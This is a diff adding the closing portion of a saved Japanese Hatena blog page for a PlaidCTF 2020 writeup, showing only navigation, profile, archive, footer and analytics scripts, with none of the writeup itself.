+        <a href="http://blog.hatena.ne.jp/guide/pro" class="open-pro-modal" data-guide-pro-modal-ad-url="https://hatenablog.com/guide/pro/modal/ad">広告を非表示にする</a>
+      
+    </div>
+  
+  
+
+
+    <div class="customized-footer">
+      
+
+        
+
+        
+
+          <div class="entry-footer-modules" id="entry-footer-secondary-modules">        </div>
+        
+
+      
+    </div>
+    
+  <div class="comment-box">
+    
+    <ul class="comment">
+      <li class="read-more-comments" style="display: none;"><a>もっと読む</a></li>
+    </ul>
+    
+      <a class="leave-comment-title js-leave-comment-title">コメントを書く</a>
+    
+  </div>
+
+  </footer>
+
+  </div>
+</article>
+
+      
+      
+    
+  
+
+  
+  <!-- rakuten_ad_target_end -->
+  <!-- google_ad_section_end -->
+  
+  
+  
+  <div class="pager pager-permalink permalink" data-gtm-vis-recent-on-screen-350810_231="8142" data-gtm-vis-first-on-screen-350810_231="8142" data-gtm-vis-total-visible-time-350810_231="100" data-gtm-vis-has-fired-350810_231="1">
+    
+      
+      <span class="pager-prev">
+        <a href="https://ptr-yudai.hatenablog.com/entry/2020/04/22/233603" rel="prev">
+          <span class="pager-arrow">« </span>
+          WebKit Exploitに対する防御機構と回避法
+        </a>
+      </span>
+    
+    
+      
+      <span class="pager-next">
+        <a href="https://ptr-yudai.hatenablog.com/entry/2020/04/13/153428" rel="next">
+          HexionCTF 2020 Writeups
+          <span class="pager-arrow"> »</span>
+        </a>
+      </span>
+    
+  </div>
+
+
+  
+
+
+
+        </div>
+      </div>
+
+      <aside id="box1">
+  <div id="box1-inner">
+  </div>
+</aside>
+
+    </div><!-- #wrapper -->
+
+    
+<aside id="box2">
+  
+  <div id="box2-inner">
+    
+      
+
+<div class="hatena-module hatena-module-profile">
+  <div class="hatena-module-title">
+    プロフィール
+  </div>
+  <div class="hatena-module-body">
+    
+    <a href="https://ptr-yudai.hatenablog.com/about" class="profile-icon-link">
+      <img src="./PlaidCTF 2020 Writeups - CTFするぞ_files/profile.png" alt="id:ptr-yudai" class="profile-icon">
+    </a>
+    
+
+    
+    <span class="id">
+      <a href="https://ptr-yudai.hatenablog.com/about" class="hatena-id-link"><span data-load-nickname="1" data-user-name="ptr-yudai">id:ptr-yudai</span></a>
+      
+  
+    
+    
+  
+
+
+    </span>
+    
+
+    
+
+    
+    <div class="profile-description">
+      <p>CTFを勉強してて学んだことをまとめていきたい</p>
+
+    </div>
+    
+
+    
+      <div class="hatena-follow-button-box btn-subscribe js-hatena-follow-button-box">
+
+  <a href="https://ptr-yudai.hatenablog.com/entry/2020/04/20/105300#" class="hatena-follow-button js-hatena-follow-button unsubscribing">
+    <span class="subscribing">
+      <span class="foreground">読者です</span>
+      <span class="background">読者をやめる</span>
+    </span>
+    <span class="unsubscribing" data-track-name="profile-widget-subscribe-button" data-track-once="">
+      <span class="foreground">読者になる</span>
+      <span class="background">読者になる</span>
+    </span>
+  </a>
+  <div class="subscription-count-box js-subscription-count-box" style="display: block;">
+    <i></i>
+    <u></u>
+    <span class="subscription-count js-subscription-count">46</span>
+  </div>
+</div>
+
+    
+
+    
+  </div>
+</div>
+
+    
+      <div class="hatena-module hatena-module-search-box">
+  <div class="hatena-module-title">
+    検索
+  </div>
+  <div class="hatena-module-body">
+    <form class="search-form" role="search" action="https://ptr-yudai.hatenablog.com/search" method="get">
+  <input type="text" name="q" class="search-module-input" value="" placeholder="記事を検索" required="">
+  <input type="submit" value="検索" class="search-module-button">
+</form>
+
+  </div>
+</div>
+
+    
+      <div class="hatena-module hatena-module-links">
+  <div class="hatena-module-title">
+    リンク
+  </div>
+  <div class="hatena-module-body">
+    <ul class="hatena-urllist">
+      
+        <li>
+          <a href="https://hatenablog.com/">はてなブログ</a>
+        </li>
+      
+        <li>
+          <a href="https://hatenablog.com/guide?via=200109">ブログをはじめる</a>
+        </li>
+      
+        <li>
+          <a href="http://blog.hatenablog.com/">週刊はてなブログ</a>
+        </li>
+      
+        <li>
+          <a href="https://hatenablog.com/guide/pro">はてなブログPro</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+    
+      <div class="hatena-module hatena-module-recent-entries ">
+  <div class="hatena-module-title">
+    <a href="https://ptr-yudai.hatenablog.com/archive">
+      最新記事
+    </a>
+  </div>
+  <div class="hatena-module-body">
+    <ul class="recent-entries hatena-urllist ">
+  
+  
+    
+    <li class="urllist-item recent-entries-item">
+      <div class="urllist-item-inner recent-entries-item-inner">
+        
+          
+          <a href="https://ptr-yudai.hatenablog.com/entry/2020/04/22/233603" class="urllist-title-link recent-entries-title-link  urllist-title recent-entries-title">WebKit Exploitに対する防御機構と回避法</a>
+
+
+          
+          
+
+                </div>
+    </li>
+  
+    
+    <li class="urllist-item recent-entries-item">
+      <div class="urllist-item-inner recent-entries-item-inner">
+        
+          
+          <a href="https://ptr-yudai.hatenablog.com/entry/2020/04/20/105300" class="urllist-title-link recent-entries-title-link  urllist-title recent-entries-title">PlaidCTF 2020 Writeups</a>
+
+
+          
+          
+
+                </div>
+    </li>
+  
+    
+    <li class="urllist-item recent-entries-item">
+      <div class="urllist-item-inner recent-entries-item-inner">
+        
+          
+          <a href="https://ptr-yudai.hatenablog.com/entry/2020/04/13/153428" class="urllist-title-link recent-entries-title-link  urllist-title recent-entries-title">HexionCTF 2020 Writeups</a>
+
+
+          
+          
+
+                </div>
+    </li>
+  
+    
+    <li class="urllist-item recent-entries-item">
+      <div class="urllist-item-inner recent-entries-item-inner">
+        
+          
+          <a href="https://ptr-yudai.hatenablog.com/entry/2020/04/02/111507" class="urllist-title-link recent-entries-title-link  urllist-title recent-entries-title">House of Husk</a>
+
+
+          
+          
+
+                </div>
+    </li>
+  
+    
+    <li class="urllist-item recent-entries-item">
+      <div class="urllist-item-inner recent-entries-item-inner">
+        
+          
+          <a href="https://ptr-yudai.hatenablog.com/entry/2020/04/02/013910" class="urllist-title-link recent-entries-title-link  urllist-title recent-entries-title"> House of Husk (仮)</a>
+
+
+          
+          
+
+                </div>
+    </li>
+  
+</ul>
+
+      </div>
+</div>
+
+    
+      
+
+<div class="hatena-module hatena-module-archive" data-archive-type="default" data-archive-url="https://ptr-yudai.hatenablog.com/archive">
+  <div class="hatena-module-title">
+    <a href="https://ptr-yudai.hatenablog.com/archive">月別アーカイブ</a>
+  </div>
+  <div class="hatena-module-body">
+  
+
+  
+    
+    
+      <ul class="hatena-urllist">
+        
+          <li class="archive-module-year" data-year="2020">
+            <div class="archive-module-button">
+              <span class="archive-module-hide-button">▼</span>
+              <span class="archive-module-show-button">▶</span>
+            </div>
+            <a href="https://ptr-yudai.hatenablog.com/archive/2020" class="archive-module-year-title">
+              2020 (20)
+            </a>
+            <ul class="archive-module-months">
+              
+                <li class="archive-module-month">
+                  <a href="https://ptr-yudai.hatenablog.com/archive/2020/4" class="archive-module-month-title">
+                    2020 / 4 (5)
+                  </a>
+                </li>
+              
+                <li class="archive-module-month">
+                  <a href="https://ptr-yudai.hatenablog.com/archive/2020/3" class="archive-module-month-title">
+                    2020 / 3 (7)
+                  </a>
+                </li>
+              
+                <li class="archive-module-month">
+                  <a href="https://ptr-yudai.hatenablog.com/archive/2020/2" class="archive-module-month-title">
+                    2020 / 2 (3)
+                  </a>
+                </li>
+              
+                <li class="archive-module-month">
+                  <a href="https://ptr-yudai.hatenablog.com/archive/2020/1" class="archive-module-month-title">
+                    2020 / 1 (5)
+                  </a>
+                </li>
+              
+            </ul>
+          </li>
+        
+          <li class="archive-module-year archive-module-year-hidden" data-year="2019">
+            <div class="archive-module-button">
+              <span class="archive-module-hide-button">▼</span>
+              <span class="archive-module-show-button">▶</span>
+            </div>
+            <a href="https://ptr-yudai.hatenablog.com/archive/2019" class="archive-module-year-title">
+              2019 (55)
+            </a>
+            <ul class="archive-module-months">
+              
+                <li class="archive-module-month">
+                  <a href="https://ptr-yudai.hatenablog.com/archive/2019/12" class="archive-module-month-title">
+                    2019 / 12 (6)
+                  </a>
+                </li>
+              
+                <li class="archive-module-month">
+                  <a href="https://ptr-yudai.hatenablog.com/archive/2019/11" class="archive-module-month-title">
+                    2019 / 11 (3)
+                  </a>
+                </li>
+              
+                <li class="archive-module-month">
+                  <a href="https://ptr-yudai.hatenablog.com/archive/2019/10" class="archive-module-month-title">
+                    2019 / 10 (6)
+                  </a>
+                </li>
+              
+                <li class="archive-module-month">
+                  <a href="https://ptr-yudai.hatenablog.com/archive/2019/9" class="archive-module-month-title">
+                    2019 / 9 (2)
+                  </a>
+                </li>
+              
+                <li class="archive-module-month">
+                  <a href="https://ptr-yudai.hatenablog.com/archive/2019/8" class="archive-module-month-title">
+                    2019 / 8 (3)
+                  </a>
+                </li>
+              
+                <li class="archive-module-month">
+                  <a href="https://ptr-yudai.hatenablog.com/archive/2019/7" class="archive-module-month-title">
+                    2019 / 7 (2)
+                  </a>
+                </li>
+              
+                <li class="archive-module-month">
+                  <a href="https://ptr-yudai.hatenablog.com/archive/2019/6" class="archive-module-month-title">
+                    2019 / 6 (4)
+                  </a>
+                </li>
+              
+                <li class="archive-module-month">
+                  <a href="https://ptr-yudai.hatenablog.com/archive/2019/5" class="archive-module-month-title">
+                    2019 / 5 (5)
+                  </a>
+                </li>
+              
+                <li class="archive-module-month">
+                  <a href="https://ptr-yudai.hatenablog.com/archive/2019/4" class="archive-module-month-title">
+                    2019 / 4 (7)
+                  </a>
+                </li>
+              
+                <li class="archive-module-month">
+                  <a href="https://ptr-yudai.hatenablog.com/archive/2019/3" class="archive-module-month-title">
+                    2019 / 3 (5)
+                  </a>
+                </li>
+              
+                <li class="archive-module-month">
+                  <a href="https://ptr-yudai.hatenablog.com/archive/2019/2" class="archive-module-month-title">
+                    2019 / 2 (1)
+                  </a>
+                </li>
+              
+                <li class="archive-module-month">
+                  <a href="https://ptr-yudai.hatenablog.com/archive/2019/1" class="archive-module-month-title">
+                    2019 / 1 (11)
+                  </a>
+                </li>
+              
+            </ul>
+          </li>
+        
+          <li class="archive-module-year archive-module-year-hidden" data-year="2018">
+            <div class="archive-module-button">
+              <span class="archive-module-hide-button">▼</span>
+              <span class="archive-module-show-button">▶</span>
+            </div>
+            <a href="https://ptr-yudai.hatenablog.com/archive/2018" class="archive-module-year-title">
+              2018 (9)
+            </a>
+            <ul class="archive-module-months">
+              
+                <li class="archive-module-month">
+                  <a href="https://ptr-yudai.hatenablog.com/archive/2018/12" class="archive-module-month-title">
+                    2018 / 12 (1)
+                  </a>
+                </li>
+              
+                <li class="archive-module-month">
+                  <a href="https://ptr-yudai.hatenablog.com/archive/2018/11" class="archive-module-month-title">
+                    2018 / 11 (2)
+                  </a>
+                </li>
+              
+                <li class="archive-module-month">
+                  <a href="https://ptr-yudai.hatenablog.com/archive/2018/10" class="archive-module-month-title">
+                    2018 / 10 (3)
+                  </a>
+                </li>
+              
+                <li class="archive-module-month">
+                  <a href="https://ptr-yudai.hatenablog.com/archive/2018/9" class="archive-module-month-title">
+                    2018 / 9 (2)
+                  </a>
+                </li>
+              
+                <li class="archive-module-month">
+                  <a href="https://ptr-yudai.hatenablog.com/archive/2018/8" class="archive-module-month-title">
+                    2018 / 8 (1)
+                  </a>
+                </li>
+              
+            </ul>
+          </li>
+        
+      </ul>
+    
+  
+
+
+</div>
+</div>
+
+    
+    
+  </div>
+</aside>
+
+
+  </div>
+</div>
+
+
+
+
+        
+
+        
+
+      </div>
+    </div>
+    
+<footer id="footer" data-brand="hatenablog">
+  <div id="footer-inner">
+    
+      <div style="display: block !important;" class="guest-footer js-guide-register test-blogs-register-guide" data-action="guide-register">
+  <div class="guest-footer-content">
+    <h3>はてなブログをはじめよう！</h3>
+    <p>ptr-yudaiさんは、はてなブログを使っています。あなたもはてなブログをはじめてみませんか？</p>
+    <div class="guest-footer-btn-container">
+      <div class="guest-footer-btn">
+        <a class="btn btn-register js-inherit-ga" href="https://blog.hatena.ne.jp/register?via=200227" target="_blank">はてなブログをはじめる（無料）</a>
+      </div>
+      <div class="guest-footer-btn">
+        <a href="https://hatenablog.com/guide" target="_blank">はてなブログとは</a>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+    <address class="footer-address">
+      <a href="https://ptr-yudai.hatenablog.com/">
+        <img src="./PlaidCTF 2020 Writeups - CTFするぞ_files/https___cdn.user.blog.st-hatena.com_blog_custom_icon_153103571_1535456424487441" width="16" height="16" alt="CTFするぞ">
+        <span class="footer-address-name">CTFするぞ</span>
+      </a>
+    </address>
+    <p class="services">
+      Powered by <a href="https://hatenablog.com/">Hatena Blog</a>
+      |
+        <a href="https://blog.hatena.ne.jp/-/abuse_report?target_url=https%3A%2F%2Fptr-yudai.hatenablog.com%2Fentry%2F2020%2F04%2F20%2F105300" class="report-abuse-link test-report-abuse-link" target="_blank">ブログを報告する</a>
+    </p>
+  </div>
+</footer>
+
+
+    
+
+    
+  <script src="./PlaidCTF 2020 Writeups - CTFするぞ_files/HatenaStar.js"></script>
+
+
+    
+      <div id="fb-root" class=" fb_reset"><div style="position: absolute; top: -10000px; width: 0px; height: 0px;"><div></div></div></div>
+<script>(function(d, s, id) {
+  var js, fjs = d.getElementsByTagName(s)[0];
+  if (d.getElementById(id)) return;
+  js = d.createElement(s); js.id = id;
+  js.src = "//connect.facebook.net/ja_JP/sdk.js#xfbml=1&appId=719729204785177&version=v2.7";
+  fjs.parentNode.insertBefore(js, fjs);
+}(document, 'script', 'facebook-jssdk'));</script>
+
+    
+    
+
+<div class="quote-box">
+  <div class="tooltip-quote tooltip-quote-star" style="display: block;">
+    <i class="blogicon-star" title="引用スターをつける"></i>
+  </div>
+  <div class="tooltip-quote tooltip-quote-stock">
+    <i class="blogicon-quote" title="引用をストック"></i>
+  </div>
+  <div class="tooltip-quote tooltip-quote-tweet js-tooltip-quote-tweet">
+    <a class="js-tweet-quote" target="_blank" data-track-name="quote-tweet" data-track-once=""><i class="blogicon-twitter" title="引用してツイートする"></i></a>
+  </div>
+</div>
+
+<div class="message-box" id="quote-star-message-box" style="display: none; position: absolute;">
+  スターをつけました
+</div>
+
+<div class="quote-stock-panel" id="quote-stock-message-box" style="position: absolute; z-index: 3000">
+  <div class="message-box" id="quote-stock-succeeded-message" style="display: none">
+    <p>引用をストックしました</p>
+    <button class="btn btn-primary" id="quote-stock-show-editor-button" data-track-name="curation-quote-edit-button">ストック一覧を見る</button>
+    <button class="btn quote-stock-close-message-button">閉じる</button>
+  </div>
+
+  <div class="message-box" id="quote-login-required-message" style="display: none">
+    <p>引用するにはまずログインしてください</p>
+    <button class="btn btn-primary" id="quote-login-button">ログイン</button>
+    <button class="btn quote-stock-close-message-button">閉じる</button>
+  </div>
+
+  <div class="error-box" id="quote-stock-failed-message" style="display: none">
+    <p>引用をストックできませんでした。再度お試しください</p>
+    <button class="btn quote-stock-close-message-button">閉じる</button>
+  </div>
+
+  <div class="error-box" id="unstockable-quote-message-box" style="display: none; position: absolute; z-index: 3000;">
+    <p>限定公開記事のため引用できません。</p>
+  </div>
+</div>
+
+<script type="x-underscore-template" id="js-requote-button-template">
+  <div class="requote-button js-requote-button">
+    <button class="requote-button-btn tipsy-top" title="引用する"><i class="blogicon-quote"></i></button>
+  </div>
+</script>
+
+
+
+    
+    <div id="hidden-subscribe-button" style="display: none;">
+      <div class="hatena-follow-button-box btn-subscribe js-hatena-follow-button-box">
+
+  <a href="https://ptr-yudai.hatenablog.com/entry/2020/04/20/105300#" class="hatena-follow-button js-hatena-follow-button unsubscribing">
+    <span class="subscribing">
+      <span class="foreground">読者です</span>
+      <span class="background">読者をやめる</span>
+    </span>
+    <span class="unsubscribing" data-track-name="profile-widget-subscribe-button" data-track-once="">
+      <span class="foreground">読者になる</span>
+      <span class="background">読者になる</span>
+    </span>
+  </a>
+  <div class="subscription-count-box js-subscription-count-box" style="display: block;">
+    <i></i>
+    <u></u>
+    <span class="subscription-count js-subscription-count">46</span>
+  </div>
+</div>
+
+    </div>
+
+    
+  <script type="text/javascript" src="./PlaidCTF 2020 Writeups - CTFするぞ_files/widgets.js"></script>
+
+<script type="text/javascript" src="./PlaidCTF 2020 Writeups - CTFするぞ_files/bookmark_button.js" charset="utf-8" async="async"></script>
+
+
+<script type="text/javascript" src="./PlaidCTF 2020 Writeups - CTFするぞ_files/jquery.min.js"></script>
+<script type="text/javascript" src="./PlaidCTF 2020 Writeups - CTFするぞ_files/jquery-ui.1.10.0.custom.min.js"></script>
+<script type="text/javascript" src="./PlaidCTF 2020 Writeups - CTFするぞ_files/jquery.flot.js"></script>
+<script type="text/javascript" src="./PlaidCTF 2020 Writeups - CTFするぞ_files/jquery.flot.time.js"></script>
+<script id="vendor-js" data-env="production" type="text/javascript" src="./PlaidCTF 2020 Writeups - CTFするぞ_files/vendor.js" crossorigin="anonymous"></script>
+
+
+
+
+
+<script type="text/javascript" src="./PlaidCTF 2020 Writeups - CTFするぞ_files/texts-ja.js"></script>
+<script id="hatenablog-js" data-env="production" type="text/javascript" src="./PlaidCTF 2020 Writeups - CTFするぞ_files/hatenablog.js" crossorigin="anonymous"></script><div style="position: fixed; top: 0px; left: 0px; width: 100%; height: 100%; display: none;"></div>
+
+
+  <script type="text/javascript">Hatena.Diary.GlobalHeader.init()</script>
+
+
+<script src="./PlaidCTF 2020 Writeups - CTFするぞ_files/api.js" async="" defer=""></script>
+
+
+
+
+
+
+    
+  <script id="valve-dmp" data-service="blog" src="./PlaidCTF 2020 Writeups - CTFするぞ_files/dmp.js" data-test-id="dmpjs" async=""></script>
+
+
+    
+
+
+
+
+
+  
+
+
+<iframe scrolling="no" frameborder="0" allowtransparency="true" src="./PlaidCTF 2020 Writeups - CTFするぞ_files/widget_iframe.6787510241df65d128e2b60207ad4c25.html" title="Twitter settings iframe" style="display: none;"></iframe><div id="cboxOverlay" style="display: none;"></div><div id="colorbox" class="" role="dialog" tabindex="-1" style="display: none;"><div id="cboxWrapper"><div><div id="cboxTopLeft" style="float: left;"></div><div id="cboxTopCenter" style="float: left;"></div><div id="cboxTopRight" style="float: left;"></div></div><div style="clear: left;"><div id="cboxMiddleLeft" style="float: left;"></div><div id="cboxContent" style="float: left;"><div id="cboxTitle" style="float: left;"></div><div id="cboxCurrent" style="float: left;"></div><button type="button" id="cboxPrevious"></button><button type="button" id="cboxNext"></button><button type="button" id="cboxSlideshow"></button><div id="cboxLoadingOverlay" style="float: left;"></div><div id="cboxLoadingGraphic" style="float: left;"></div></div><div id="cboxMiddleRight" style="float: left;"></div></div><div style="clear: left;"><div id="cboxBottomLeft" style="float: left;"></div><div id="cboxBottomCenter" style="float: left;"></div><div id="cboxBottomRight" style="float: left;"></div></div></div><div style="position: absolute; width: 9999px; visibility: hidden; display: none; max-width: none;"></div></div><div style="top: -9999px; z-index: -9999;"></div><script type="text/javascript" id="">(function(a){var b=a.createElement("iframe"),c="https:"==a.location.protocol?"https://":"http://";b.src=c+"cf.im-apps.net/imid/beacon.html";b.style.display="none";a.body.appendChild(b)})(document);</script><iframe src="./PlaidCTF 2020 Writeups - CTFするぞ_files/beacon.html" style="display: none;"></iframe><script type="text/javascript" id="" src="./PlaidCTF 2020 Writeups - CTFするぞ_files/pageview.js"></script><script type="text/javascript" id="">!function(c,d,b,f){if(!d[c]){d[c]=function(){d[c].instances.push(this);this.init&&this.init()};d[c].instances=[];for(var a=0,e=["td_send","td_send_imid"];a<e.length;a++)d[c].prototype[e[a]]=function(a){return function(){this["tmp_"+a]=this["tmp_"+a]||[];this["tmp_"+a].push(Array.prototype.slice.call(arguments))}}(e[a]);a=b.getElementsByTagName(f)[0];b=b.createElement(f);b.async=!0;b.src="//cf.im-apps.net/sdk/tdim-1.1.0.min.js";a.parentNode.insertBefore(b,a)}}("TDIM",window,document,"script");
+var tdimjs=new TDIM;tdimjs.debug=!1;tdimjs.td_host="in.ybi.idcfcloud.net";tdimjs.td_api_key="312/b4f0042d7c26b4f44d2561bbb5c396349b54b10e";tdimjs.td_db="cosmi_6604";tdimjs.im_api_token="TlOjMPj_m54xiIkb8Mzm7Q";tdimjs.td_send_imid("pageviews",{custom_data:"Linux"});</script><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8/5+hHgAHggJ/PchI7wAAAABJRU5ErkJggg==" width="1" height="1" border="0" class="bigmining_dmp_beacon" style="display: none;"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8/5+hHgAHggJ/PchI7wAAAABJRU5ErkJggg==" width="1" height="1" border="0" class="bigmining_dmp_beacon" style="display: none;"><img src="./PlaidCTF 2020 Writeups - CTFするぞ_files/adsct(1)" width="1" height="1" border="0" class="bigmining_dmp_beacon" style="display: none;"><script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='//www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer','GTM-P5GX4M');</script><div style="display: none; visibility: hidden;"><script type="text/javascript">!function(c,d,b,f){if(!d[c]){d[c]=function(){d[c].instances.push(this);this.init&&this.init()};d[c].instances=[];for(var a=0,e=["td_send","td_send_imid"];a<e.length;a++)d[c].prototype[e[a]]=function(a){return function(){this["tmp_"+a]=this["tmp_"+a]||[];this["tmp_"+a].push(Array.prototype.slice.call(arguments))}}(e[a]);a=b.getElementsByTagName(f)[0];b=b.createElement(f);b.async=!0;b.src="//cf.im-apps.net/sdk/tdim-0.11.2.js";a.parentNode.insertBefore(b,a)}}("TDIM",window,document,"script");var t=new TDIM;
+t.td_api_key="312/b4f0042d7c26b4f44d2561bbb5c396349b54b10e";t.td_db="cosmi_8045";t.im_api_token="omO0CDJd98sxiIkb8Mzm7Q";t.gtm_dl="dataLayer";t.td_send_imid("pageviews");</script></div><div style="display: none; visibility: hidden;">
+<script src="./PlaidCTF 2020 Writeups - CTFするぞ_files/oct.js" type="text/javascript"></script></div><div style="display: none; visibility: hidden;"></div><div style="display: none; visibility: hidden;"></div><div style="color: rgb(0, 0, 0); position: absolute; display: none; z-index: 10002; left: 0px; top: 0px; background-color: rgb(255, 255, 255); border: 0px; padding: 0px; text-align: center;"><div style="text-align: left; margin: 0px; padding: 0px;"></div></div></body></html>
